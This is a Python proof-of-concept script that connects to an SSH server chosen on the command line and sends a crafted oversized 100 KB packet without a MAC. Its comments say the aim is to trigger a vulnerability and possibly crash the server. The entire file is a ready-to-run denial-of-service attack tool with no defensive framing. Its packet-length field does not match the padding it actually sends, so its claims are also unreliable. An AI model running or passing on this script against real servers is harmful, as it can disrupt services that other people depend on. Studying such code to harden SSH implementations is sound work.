#!/usr/bin/env python3
import socket
import struct
import sys
import os

def create_ssh_packet(payload_length, padding_length):
    """
    Craft an SSH packet according to RFC 4253 Section 6.1.
    Format: [packet_length][padding_length][payload][padding][MAC]
    """
    # packet_length includes padding_length, payload, and padding
    total_length = 4 + padding_length + payload_length  # 4 bytes for packet_length and padding_length fields
    
    # Ensure padding is at least 4 bytes and aligns to block size (usually 8 or 16)
    block_size = 8
    padding_needed = block_size - (payload_length % block_size)
    if padding_needed < 4:
        padding_needed += block_size
    
    # Construct packet
    packet_length_bytes = struct.pack('>I', total_length)
    padding_length_bytes = struct.pack('>B', padding_needed)
    payload = b'A' * payload_length
    padding = os.urandom(padding_needed)
    
    # MAC is omitted for simplicity in this PoC; vulnerable servers may still process the packet
    return packet_length_bytes + padding_length_bytes + payload + padding

def send_oversized_packet(target_ip, target_port, packet_size):
    """
    Send an oversized SSH packet to the target.
    """
    try:
        # Create a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        # Connect to the SSH server
        print(f"[*] Connecting to {target_ip}:{target_port}...")
        sock.connect((target_ip, target_port))
        
        # Send SSH identification string (required by RFC 4253 Section 4.2)
        banner = b"SSH-2.0-PoC\r\n"
        sock.sendall(banner)
        
        # Wait for server banner
        server_banner = sock.recv(1024)
        print(f"[+] Received server banner: {server_banner.decode().strip()}")
        
        # Craft oversized packet
        print(f"[*] Crafting oversized SSH packet with length {packet_size}...")
        packet = create_ssh_packet(packet_size, 4)
        
        # Send the oversized packet
        print(f"[*] Sending oversized packet...")
        sock.sendall(packet)
        
        # Attempt to receive response
        try:
            response = sock.recv(1024)
            if response:
                print(f"[+] Received response: {response}")
            else:
                print("[!] Connection closed by server without response.")
        except socket.timeout:
            print("[!] No response received (timeout). Server may be processing or crashed.")
        except ConnectionResetError:
            print("[!] Connection reset by server. Possible crash or rejection.")
        
        sock.close()
        
    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 poc_ssh_transport_oversized_packet.py <target_ip> <port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    # RFC 4253 recommends max packet size of 35000 bytes
    # We send a packet significantly larger to trigger the vulnerability
    oversized_packet_size = 100000  # 100KB packet
    
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Sending oversized packet of size {oversized_packet_size} bytes...")
    
    send_oversized_packet(target_ip, target_port, oversized_packet_size)

if __name__ == "__main__":
    main()